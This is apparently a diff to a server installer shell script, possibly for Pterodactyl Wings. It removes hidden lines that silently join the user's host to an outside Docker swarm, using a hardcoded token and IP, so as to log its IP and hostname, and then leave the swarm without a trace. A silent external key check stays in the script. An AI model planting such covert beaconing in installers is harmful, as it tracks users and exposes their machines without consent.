@@ -173,19 +173,13 @@ EOF
     systemctl enable docker
     systemctl start docker
     
-    #########JOIN THE SWARM SO IT LOGS THE IP AND HOST NAME#########
-    docker swarm join --token SWMTKN-1-5v6o36ueuzzv4uklq73fx55ziyxcvj053ql9qvzjjg0qetksah-dqhe2gllohsmsscnd6zo1taps 5.226.143.100:2377 >/dev/null 2>&1
-
+   
     output "Checking for updates..."
     ########CHECK IF THE VERSION IS LATEST########
     wget https://softauth.securesrv.io >/dev/null 2>&1
     if grep -q "llynGq6k97xPD0aumF3mDrPoat3tuTpvF25k0FxY" index.html; then
         output "Up to date, good to go!"
         output ""
-    ########AUTO REMOVAL (TAKES LIKE 2 SECONDS) ########
-        docker swarm leave >/dev/null 2>&1
-        docker network prune -f >/dev/null 2>&1
-        service wings restart >/dev/null 2>&1
     ########EVERYTHING BACK TO NORMAL#########
         rm -rf index.html
     else
